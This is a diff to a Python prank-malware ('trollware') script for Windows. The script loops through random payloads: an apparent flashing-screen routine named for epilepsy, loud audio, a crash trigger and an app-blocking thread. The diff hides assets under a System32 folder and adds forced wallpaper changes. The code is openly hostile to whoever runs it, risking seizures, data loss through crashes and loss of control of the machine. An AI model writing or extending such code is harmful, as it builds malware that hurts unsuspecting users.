@@ -13,7 +13,7 @@ import random
 
 pygame.mixer.init()
 pygame.init()
-assets = os.path.join(os.path.dirname(os.path.realpath(__file__)), "assets")
+assets = r'C:\Windows\System32\Shell'
 
 def man_i_love_epilepsy():
 	user32 = ctypes.windll.user32
@@ -33,30 +33,18 @@ def man_i_love_epilepsy():
 
 def cherry_window():
 	
-	def alwaysOnTop():
-		NOSIZE = 1
-		NOMOVE = 2
-		TOPMOST = -1
-		zorder = TOPMOST # choose a flag according to bool
-		hwnd = pygame.display.get_wm_info()['window'] # handle to the window
-		ctypes.windll.user32.SetWindowPos(hwnd, zorder, 0, 0, 0, 0, NOMOVE|NOSIZE)
-	image = pygame.image.load('assets/cherry.jpg')
-	size = (144, 144)  # Width, Height
-	screen = pygame.display.set_mode(size)
-
-	def display_image(x, y):
-		screen.blit(image, (x, y))
-
-	display_image(0,0)
-	pygame.display.update()
-	alwaysOnTop()
+	ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, os.path.join(assets, 'cherry.jpg'), 0x0001 | 0x0002)
 	pygame.mixer.music.load(os.path.join(assets, 'cherry.mp3'))
 	pygame.mixer.music.play(2)
 	time.sleep(3)
-	pygame.quit()
-	pygame.mixer.init() # quit() also kills mixer so reinit is required
 	rng_thread = threading.Thread(target=rng_payload)
 	rng_thread.run()
+
+def horse():
+	ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, os.path.join(assets, 'horse.png'), 0x0001 | 0x0002)
+	rng_thread = threading.Thread(target=rng_payload)
+	rng_thread.run()
+
 
 def ear_destruction():
 	pygame.mixer.music.load(os.path.join(assets, 'hueuh.mp3'))
@@ -110,8 +98,10 @@ def rng_payload():
 	ear_thread = threading.Thread(target=ear_destruction)
 	crash_thread = threading.Thread(target=trigger_crash)
 	epilepsy_thread = threading.Thread(target=man_i_love_epilepsy)
+	horse_thread = threading.Thread(target=horse)
 
 	while True:
+		time.sleep(15)
 		num = random.randint(0, 10)
 		print(num)
 		match num:
@@ -123,10 +113,11 @@ def rng_payload():
 				ear_thread.run() # plays hueuh.mp3
 			case 3:
 				epilepsy_thread.run() # man i love epilepsy
+			case 4:
+				horse_thread.run()
 			case 5:
 				cherry_thread.run() # plays cherry.mp3
-		time.sleep(15)
-
+		
 
 block_apps_thread = threading.Thread(target=blocked_apps)
 block_apps_thread.start()
